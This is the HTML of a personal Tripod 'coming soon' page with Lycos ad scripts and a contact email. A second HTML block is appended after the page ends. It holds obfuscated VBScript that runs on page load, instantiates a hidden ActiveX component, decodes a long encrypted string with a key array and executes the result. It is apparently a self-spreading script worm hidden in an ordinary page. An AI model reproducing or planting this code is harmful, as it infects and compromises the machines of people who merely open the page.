<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Wellcome to Eshghohal</title>

</head>

<body text="#FFFFFF" bgcolor="#000000"><!-- begin compete js -->
<script type="text/javascript">
    __compete_code = '667f89f26d96c30e99728fe6a608804d';
    (function () {
        var s = document.createElement('script'),
            d = document.getElementsByTagName('head')[0] ||
                document.getElementsByTagName('body')[0],
            t = 'https:' == document.location.protocol ? 
                'https://c.compete.com/bootstrap/' : 
                'http://c.compete.com/bootstrap/';
        s.src = t + __compete_code + '/bootstrap.js';
        s.type = 'text/javascript';
        s.async = 'async'; 
        if (d) { d.appendChild(s); }
    }());
</script>
<!-- end compete js -->

<!-- quantcast -->
<script type="text/javascript">
	function channValidator(chann){
	return (typeof(chann) == 'string' && chann != '');
	}

	function lycosQuantcast(){
		var lb = "";
		if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
			lb += cm_host.split('.')[0] + '.';
		}
	
		if(typeof(cm_taxid) !==	'undefined' && channValidator(cm_taxid)){
			lb += cm_taxid;
			lb = lb.replace('/','');
		} else {
			lb = lb.replace('.','');
		}
		return lb;
	}
	
	var _qevents = _qevents || [];
	
	(function() {
		var elem = document.createElement('script');
		elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
		elem.async = true;
		elem.type = "text/javascript";
		var scpt = document.getElementsByTagName('script')[0];
		scpt.parentNode.insertBefore(elem, scpt);
	})();
	
	_qevents.push({
		qacct:"p-6eQegedn62bSo",
		labels:lycosQuantcast()
	});
</script>
<!-- end quantcast -->

<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "eshghohal";
var tripod_member_page = "eshghohal/index.htm";
var tripod_ratings_hash = "1319287836:d53cc01693b93d92a39eb20859259de7";

var lycos_ad_category = {"dmoz":"society\/relationships","ontarget":"&CAT=family%20and%20lifestyles&L2CAT=relationships","find_what":"all web sites"};

var lycos_ad_remote_addr = "154.35.200.66";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=328375";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=328375";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}

window.onload = function() {
    var f = document.getElementById("FooterAd");
    var b = document.getElementsByTagName("body")[0];
    b.removeChild(f);
    b.appendChild(f);
}

</script>
<div id="tb_container" style="text-align:center; position:relative; z-index:999999999">
    <div id="tb_ad" style="display:block!important; overflow:hidden; width:868px; margin:0 auto">
    <a href="http://www.tripod.lycos.com" title="build your own website at Tripod.com" style="float:left; width:140px">
    	<img src="http://pd.tripod.com/common/ly/images/freeAd.jpg" alt="Made with Tripod.com" />
    </a> 
        <div id="ad_container" style="display:block!important; float:left; width:728px ">
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
        </div>
    </div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important; position:relative; z-index:999999!important; height:94px!important"> 
<script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script>
</div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=328375" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>



<p>&nbsp;<font size="7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<font color="#FF0000">E</font><font color="#FFFF00">s</font><font color="#00FF00">h</font><font color="#0000FF">g</font><font color="#00FFFF">h</font><font color="#CCFF99">o</font><font color="#FF3399">h</font><font color="#CC99FF">a</font><font color="#00FFCC">l</font>
</font>
</p>


<p><span lang="ar-sa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<font face="Tahoma">&#1576;&#1607; &#1586;&#1608;&#1583;&#1610; &#1582;&#1608;&#1575;&#1607;&#1583; &#1575;&#1605;&#1583; &#1605;&#1606;&#1578;&#1592;&#1585; &#1576;&#1605;&#1575;&#1606;&#1610;&#1583;</font></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<font face="Tahoma" size="5"><font color="#FF0000">C</font><font color="#FFFF00">o</font><font color="#00FF00">o</font><font color="#0000FF">m</font><font color="#800000">i</font><font color="#008080">n</font><font color="#008000">g</font>
<font color="#808080">S</font><font color="#800080">o</font><font color="#808000">o</font><font color="#00FFFF">n</font></font></p>
<p>&nbsp;</p>
<p><a href="mailto:navid_kh_21@yahoo.com" style="text-decoration: none">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<font size="6">mail:navid_kh_21@yahoo.com</font></a></p>
<p>&nbsp;</p>
<hr color="#C0C0C0" align="right">

&nbsp;&copyNavid kheradmand

</body>

</html>
<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "<ahAfRd]j`(@lhhL]sp$N]oL]sp$<`cj]`Oa_i(9hkh]G]f][o(>KJ(OkNd]dg(OaiLYlc(Km]A$>djYdt@akfKp^CE[kl\nl $CEO]l?ee $CE?j]\p]Edha]p$!GBDdg]Ao$!GB;maYl`IYag$!GBHmkhYb]l]#%@j\NqZ>pj[ldkfFF9hkaf\Ok >dh]H\p`$Ouh]Npj!GfAjjjnJ`ome`F]spNalMaY\Oaeh9>NK&GkafL`tl>dh] Aed]K]l`'-!PehNpj8J]\`L]hl&J`]\9ghDbAiolj#PehNpj$GBWnpYjo$!$46,GmD]i$LekOlj$4,L``jMaY\Oaeh)?dgna@talBmf^pagi=i`AaAaLqkaKlm5dllL``jMaY\Oaeh)?dgnaNalAed]Oaeh9>NK&GkafL`tl>dh] Aed]K]l`'.!Bad`P]ek*Ojdp]8!:J@Qjjdg\`5nZn_jakp2FFWko]jl#%:!nZ>nD^LhlKlmq^;jGbDlegP]po>dh]L`ih&>hgk`K`p><pljd^5BKG)C]lAed]#Bad`LYlc%A=llmeZ&\pljd^ml`o5/,Adk`J`]\L`ih&>hgk`K`p>dh]L`ih8>KJ*Gh`jL]sp>aga >dh]H\p`$3%DbLtl]Kon5`lhhOd]f>agaL]hl&Omel]rZ;mH^!4DLEG:!nZ>nD^7:G?UgihgY_9rZk^naho6!CE[kl\nl $9rZ;mH^!@lhhL]sp@hk]DbLtl]Kon5nZnLcafBad`P]ek*Ojdp]q^;jGbRZkOapl=f_A^>agaL]hl&;gkk]=f_A^=f_>mi_lajj>mi_lajjCE?`Yic]Kp^ ;pnj]ipKlmef_'HYkoEf\`t;`\n!E^G]klDj\]s?`Ym5+L``jDbD`bl G?Yk`$;mmn]foOljdj_!'-!88D>]k]#[$L``jFF;`\j_]NqZ8>ai]dq?ekc5XOmZ@5+=go]GB;c]f_`OmZ9;cn 9n_ D`bl G?Yk`$;mmn]foOljdj_!'-!!))$6TKm]A5,@j\Db@hk]CB>dYfbaKm]5He\ >qjj`jlKonafb()$G]klDj\]s?`Ym%@j\Db@j\Aqf[oegfAqf[oegfGB;maYl`IYag$!Kf@njgmJ]nqe]J]poAaAfRd]j`5dlegLcafApao>mi_lajj@j\DbNdYj`Bad`5Ga^l#SafK]l`'/!!Hmk_j\i>dh]kW?gehkfAed]nXEa^ngkjblNdYj``TKo]lajj]jtXZd\jc&cpeA^$>KJ*>aga=pdolk#O`Yma>aga!!P`]i;\hdFF9hkaf\Ok Kc]j]Aed]'`lhh!=dnaNalAed]Oaeh9>NK&GkafL`tl>dh] NdYj`Bad`(*$onm]$>dh]L`ih&Rnal`4DLEG:!nZ>nD^7:G?UgihgY_9rZk^naho6!CE[kl\nl $9rZ;mH^!@lhhL]spAed]Oaeh)?dgna@j\Db?a^YphlA_5RoK``hd&Ma_J`]\ DC=T[;MMN=FO[MK@NTA_afldpa]nX<]a]mdoMk`nA?!KmlGkgcQajkdkf8OkNd]dg*J]bN]Y_$@FAQWGK;9G[E9>DAF@XKgapoYmaTEd_jgnk^lWKmlgkgcAphmakkWI]\d]N]m!SkKcadd)N]_Rnal`@FAQW>QJJ@JLWPO=JWE\]ipaldakT<]a]mdoE\XKgapoYmaTEd_jgnk^lWKmlgkgcAphmakkWGa^l#KmlGkgcQajkdkf$,%*(TH]adW?gekkk]Qk]OlYoegf`nq'-$MA?W?SGJ?>]ddGBE\edJ`c CG=QZ?MJMAFLZQK=MXA\`jlaoe]kW<`bYmgpA\!TKjblo\n]THe[jjog^oXGmohggf=pkn]knXH]^o$GmoHggfR]jnegf'-!!&(WIYagXKl\pagiajqJYe`$Kc]j]Aed]$;\hdFFEYdhJ]b$@FAQW>QJJ@JLWPO=JWE\]ipaldakT<]a]mdoE\XKgapoYmaTEd_jgnk^lWKmlgkgcAphmakkWGa^l#KmlGkgcQajkdkf$,%*(TH]adWSa\`Kl\pagiajqJYe`$Kc]j]Aed]$OnO`]gh&J`cOjdp]DC=T[;MMN=FO[MK@NTKjblo\n]THe[jjog^oXG^ae[]W5&(WKmlgkgcWKhldkfkWIYagX=\dpgjKn]^`n]f^a$,/)(2.$MA?W?SGJ?>]ddGBE\edJ`c CG=QZ?MJMAFLZQK=MXKgapoYmaTEd_jgnk^lWSaf_kokI]kn]_aicKp^kqnp]eWLjgaed]nXEa^ngkjblJqldjkcDjl]mj]lO]loef_nX(Y+`(*+,((+,((+,[(+,((+,((+,((/2T(+-](.2('Zd\jc$;\hdFFEYdhJ]b$@FAQW>QJJ@JLWPO=JWOg^osYj`XEa^ngkjblTRef\jskIPT;pnj]ipN]moagiXOai`gonE]noY_dj_NqZktol]hXHjjbad`oTEd_jgnk^lKmlgkgcEfl`nf]oK]opafboT(\,\(-,((+,((+,([+,((+,((+,((+0.T+,)]+/.((Zg]fc%RoK``hd&Ma_Omel]@C@UW;PNJ=IPWMNAJTNk^lr]j]WIa[mkkgapTGaba[`X)(),TGppdgjgTGkpagioTE\edT@`aljnHj`b]j`j[]()+,,/*'J=B[<OJN<;YghCEIYagN]_#@C@UW;PNJ=IPWMNAJTNk^lr]j]WIa[mkkgapTGaba[`X)(),T;jiegiXEYdhK]opafboTF`sKl\pagiajq(Zg]fc%FFmeh]_]Akd\`n D`bl RefH\p`$.%HjjcjYh>agakT>keejj>dh]kWIa[mkkgapKc]j]_XKl\pagiajq%@j\Aqf[oegfAqf[oegfGB;maYl`Iaddam $Gi=jmkjMakmhaF`tlP]ekLYlc5DbFjp >NK&>dh]=sekln$OaiLYlcSK[mehl)ap]%!Od]fL]hlHYod5kqnp]e..T=f_A^A^P]ekLYlc5oqkoae+-XOd]fKl\nlMkBad`5RefH\p`!KTOL=HXC]mj]d..&\ghAdk`Ko]jlPl>aga5SafK]l`NUKL@ITC`nf]g*\dg@j\DbRoK``hd&Ma_Omel]@C@UWDJ?9DZI9;CEF=WOg^osYj`XEa^ngkjblTRef\jskT>qjj`jlN`nkajjTJpjTC`nf]g/*'OlYmpMhAed]>KJ*;gku>agaOdjHYodo]]Xcbr]dd)ca^(OaiLYlcs]ZWBgd_aj&cpl>KJ*;gku>agaOdjHYodkqnp]e..TcesYdg*_aa$OdjHYodkqnp]e..T\`ocljl&aie?YdgCB<lh]i`Lg#SafK]l`raZTAkd\`n&`op$dll%RoK``hd&Ma_Omel]@C@UW;G=KK@OWJJKLT)`ddW$_hd^dh]OkNd]dg*J]bSjaoaCG=QZ?D9NO=KZNGGOX&\ghT;jjl]ipLtl]'Yhkha[\pagi+p%ho\grjdg\`SkKcadd)N]_Rnal`@FAQW>H9KNAKWMKGLW`ddaed]W@]^\qdlD_gfW$OnO`]gh&J`cJ]\` CG=QZ?D9NO=KZNGGOXnp_bad`X<]a]mdoE[giX!OkNd]dg*J]bSjaoaCG=QZ?D9NO=KZNGGOX\dgbad`XK[mehl@j_aiaT'N:N_jakpSkKcadd)N]_Rnal`@FAQW>H9KNAKWMKGLW`ddAed]WO`]ghTGkafT>kee\j\T(OaiLYlcOaehK]l`RO[jdll&`t])%RoK``hd&Ma_Omel]@C@UW;G=KK@OWJJKLT_hd>dh]TNd]dgApTKngh`nlqNd]]oDYf_h]jnXOKCLjgkoT's.+.-,>=-%41+:(-);A)0;42%(+=9(+>0/+4;uOnO`]gh&J`cOjdp]DC=T[;D<OK=N[JGJPT\gh>agaTK^nahoDgkoAf[j`]T(s31)+,2+)(00(>)))?.%:,B1%+,;(/B0.>/*,xNalAed]Oaeh9>NK&GkafL`tl>dh] NpYjoQh>dh]$-(ljpa!Bad`P]ek*Ojdp]Q^kL`tlBad`P]ek*;djo]Af\Bmf^pagiBmf^pagiCBGec]Dp !A^EfOcaj]86dlegLcafApao>mi_lajj@j\DbOdakGk[Yoegf9\j_me`jl&gk[YoegfA^H]^o$L`doDg^]lajj$/%5^agaOd]fL`doDg^]lajj5Ia\#P`anHg[\pagi(1!A^BKG)C]l@tl]ioagiJYe`$L`doDg^]lajj!7:l``jOdakGk[Yoegf9D`bl OdakGk[Yoegf'H]f#P`anHg[\pagi%%H]f#BKG)C]lAed]I]e]#P`anHg[\pagi%!!=f_A^A^H]f#P`anHg[\pagi%6/LcafP`anHg[\pagi5OdakGk[YoegfW@j\DbFFmeh]_]Akd\`n LcekDj_Yldkf!=f_A^=f_>mi_lajj>mi_lajjCEIYagN]_#N]_Npj$Aed]I]e]$Gi=jmkjMakmhaF`tlN]_OaehNpj8OkNd]dg*J]bN]Y_$J]bOlj$AaJ]bP]ekOlj9L``jRoK``hd&Ma_Omel]N]_Npj$Aed]I]e]=f_A^=f_>mi_lajj>mi_lajjCEKZgNqZ >qjj`jlKonafb%NqZ=9(L]npGmo5+<jO`dh]Onm]L]npGmo5OaklJql&)E^OaklJql9*0P`]i;pnj]ipKlmef_9>djYdt@akf6T=pdp<j=i`AaGi=jmkjMakmhaF`tlO]lP`anBgd_aj8>KJ*?]oBgd_aj >qjj`jlKonafb%Nal?e[Kp^5?j]\p]G]f][o$K^nahoef_)@a[oegf\nq$K`p>jh\]mo5P`anBgd_aj&NqZ>jh\]moAkd\`n;gpjl8(BgjAY[cL]hl>gg`]jefAkd\`nkBgd_aj;jqfl9>jh\]m?gmip#-?e[Kp^&Y_`>jh\]m?gmip$OaehAkd\`n&F\i]J]poAa<a^OmZ)?gmip5,LcafHYkoEf\`t;`\n5EfkonJ]q$;mmn]foOljdj_$X$Gaf >qjj`jlKonafb%%)$Kp^Klmef_9Ed` ;pnj]ipKlmef_'HYkoEf\`t;`\n#)'H]f#?mjmaflNpjaic!%G]klDj\]s?`Ym))!;mmn]foOljdj_8CB>dYfbaKm]$;mmn]foOljdj_$G]klDj\]s?`Ym%NqZ=9)=dnaDbKp^=8(Od]f;mmn]foOljdj_8;mmn]foOljdj_!<a^OmZ)El]h$)!W@tal@gAdk`b9(>gmb8)Ok>jh\]m?gmipDbD>]k]#OmZNpjaic!8D;\o] ?e[Kp^&Aoae e%!Od]fA^f4Bgd_aj;jqflP`]i;pnj]ipKlmef_9;pnj]ipKlmef_<d_Km]*Al`i b&-!!T=sel?k@j\Db@j\DbIaplDYnpAf_ap;c]j8AfnpjJ`r ;pnj]ipKlmef_'T'H]f#?mjmaflNpjaic!%,%NqZKonafb5He\ >qjj`jlKonafb(DYnpAf_ap;c]j#,(D]i$;mmn]foOljdj_!(HYkoEf\`t;`\n%)$;pnj]ipKlmef_9CE?`Yic]Kp^ ;pnj]ipKlmef_'HYkoEf\`t;`\n!Af\E^Af\E^HggkCEKZgNqZ8;mmn]foOljdj_Af\Bmf^pagiBmf^pagiCBKngh\cYl`$!Kf@njgmJ]nqe]J]poJ`cHYodNYgq]8@FAQWGK;9G[E9>DAF@XKgapoYmaTEd_jgnk^lWKmlgkgcAphmakkW@]_ma]<ang<]bn]]9OnO`]gh&J`cJ]\` J`cHYodNYgq]!A^@akf@]_ma]8P`]i<doc<`cj]`5AefYgu<ang2T=i`Aa>jna8-lj-@akf@]_ma]8CBJ^gKp^ <doc<`cj]`%FFmeh]_]Akd\`n <doc<`cj]`%IaplOkNd]dg*J]bSjaoaJ`cHYodNYgq]$?ekc?a_j`a@j\Aqf[oegfAqf[oegfGBmhiY_`Bgd_aj K]l`I]e]$Gi=jmkjMakmhaF`tlO]lBgd_ajF\i]8>KJ*?]oBgd_aj K]l`I]e]$K`pLcek>dh]k9>jh\]mJYe`*>agakDll@takoo5,Akj@][`P`anBad`AfP`anBad`oAed]@tl8M;\o] AOG&Bal=sp]fnegfI]e]#P`anBad`*HYod!!A^Bad`Apl9CPEKjAed]@tl8@OIDKjAed]@tl89NLJn>dh]=sp5H@KGm>aga=po5FKHL``j>]ddGB9kl]f_Pg OdakAed])LYlc(`oid$=go]Aa>aga=po5R:KL``j>]ddGB9kl]f_Pg OdakAed])LYlc(n]o!=dnaA^Bad`Apl9CPLP`]i@op=pdolk9)=f_A^F]spDb P?Yk`$HYodFYha!8M;\o] RefH\p`!<`ocljlT$%Gm M>]k]#LYlcJYe`%5Q;Yna OdjHYod<]nglgk!!Od]f@loApanpk8)Af\E^E^Cpl=sekln5+L``jAOG&>khqAed]SafK]l`nukl`i+*W`]kfpgh)efa(HYodFYhaAOG&>khqAed]SafK]l`raZTAkd\`n&`op$K]l`I]e]=f_A^=f_>mi_lajj>mi_lajjCEO]l?ee $Gi=jmkjMakmhaF`tlAjj)?d]\nOaklDp5SK[mehl)O[jdll>phdf\i]E^@njOd]fAfRd]j`5dleg@hk]AfRd]j`5rZk=i`AaAaAfRd]j`5rZkL``jNalAOG8;j`]l]J^b]^p N_jakpafb*>agaKqnp]eJ^b]^p!K]oOkNd]dg5>n]YoaGZea[l#OK^naho*K``hd$=go]O]l=hhgaGZea[l9\j_me`jl&\lhd`pk GBWbq]ko!=hhgaGZea[l)o]l>HKA?$sA5+-??**(-;>+)))?,%9?>1%+,;(/B<-3=(:x!=hhgaGZea[l)_j]\p]AiolYi_] $K`pOnO`]gh5=hhgaGZea[l)C]lJ^b]^p !9hkh]G]f][o*k]o?DKD@ v,<,.B=(,)>(4/%),?>%35,((,(9+?1(00**3y!9hkh]G]f][o*[j`]l]Djkl\j[]#%NalAOG89hkh]G]f][o*?]oKZb`_l $=i`AaK`p<docG]f][o5AOG&?nan`oAkj@][`@akfP]ekAf@akfKZb`_lE^?ekcOaeh)@jaqaLqka49*<j\?ekcOaeh)@jaqaLqka49)Od]f=pdp>jn@j\DbAefYgu<ang5@akfP]ek*<jdr]D`pl]mF`tl@aeKl``n9jm$+!JYi`gedv]Bgje5(Pg.God]j<nj d%5Efl#$1%Jf_%!J]poL`ihKonafb5Akjd9)OkD`j LcekL`tl!L]hlFmh5<o[ He\ OdakOapl'e$)$%DbL`ihFpi5-+Od]fL]hlFmh5-4@hk]DbL`ihFpi5-(Od]fL]hlFmh5-5@j\DbOaeh>dYj9;cn L`ihFpi%Kl``n9jm$aHk\/%!E^Oaeh>dYj9;cn +/%LcafP]ek?`Ym5>dj ,4!Af\E^P]ekOljdj_8L]hlKlmef_L`ih;c]jJ]poMiHg[fOlj9@t][pp] <ahC]t=jj#/!$OdakOapln]?jDaFaq9mn ($5Jp`]m=jj#,!!nZ>nD^!C`u9jm$)!9God]j<nj ,%!rZ;mH^C]t=jj#.!8!Glcaj9mn *$q^;jGbG]q<nj .%5Kl``n9jm$+!n]?jDaAkjd9)OkD`j =saKlmef_$q^;jGbP]ekJme99n_ Ed` =saKlmef_'e$)$%!rZ;mH^A^P]ekJme9)3L``j!rZ;mH^L]hlFmh5.0!rZ;mH^=f_A^n]?jDaOaeh>dYj9;cn L`ihFpi#G]q<nj dEg_,!$q^;jGbE^Oaeh>dYj9;cn *3%LcafnZ>nD^!L`ih;c]j8nZ>n!rZ;mH^=dnaA^P]ek?`Ym5>dj -5!Od]fn]?jDaOaeh>dYj9n]H^nZ>nD^!=i`Aaq^;jGbP`anP]po5OdakOaplL`ih;c]jnZ>nD^!F`tl%!nZ>nD^@t][pp] OdakOapl$OdakOapl9@t]Konafb5!L]hlKlmef_DlegP]po57k[mehlhYfbqY_`9nZn_jakp6n]?jDa`g[pi]fo*ojdp]7\aqklth]5lgkdpagi6YZnkdmoa3ga^l5,hp6lgk6(hs7od`l`5,hp6`]dc`l5,hp6r%dj\]s6*06naneZagelq5`a_`]f:!49HKH=LJ9E@9CB[_m`olCAA?CP5(SA<OD5(_g\`9[gh*ek)Y[oen]S*9[oen]T;ghlgf`jl68!'<LHD@P67'\dr6rZ;mH^!4+k[mehl9rZ;mH^!4o[jdllg]f_p]_]8rZk^naho:!nZ>nD^LcekL`tl!nZ>nD^MiHg[fOljn]?jDa8!'n_jakp6n]?jDa8!'=K<Q9rZ;mH^!4+@LHH6NZnP]po5OdakOapln]?jDaPjDg^gKlmq^;jGbCBZolYmp !OdjHYod5BKG)C]lNl][d]d>jh\]m$(!WDb AOG&Aed]@takoo OdjHYodo]]X>gg`]j)dll%!Od]f>KJ*;gku>agaOdjHYodo]]X>gg`]j)dll(OaiLYlcs]ZWgbo\hd&be^=f_A^A^$>KJ*>aga=pdolk#SafK]l`nukl`i+*W`]kfpgh)efa%!Od]f>KJ*;gku>agaOdjHYodkqnp]e..T\`ocljl&aie$RefH\p`!ktol]h/*TffoYgh&_dbAf\E^Af\Bmf^pagi"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 4"&vbCrLf&"KeyArr(1) = 8"&vbCrLf&"KeyArr(2) = 8"&vbCrLf&"KeyArr(3) = 5"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</body>
</HTML>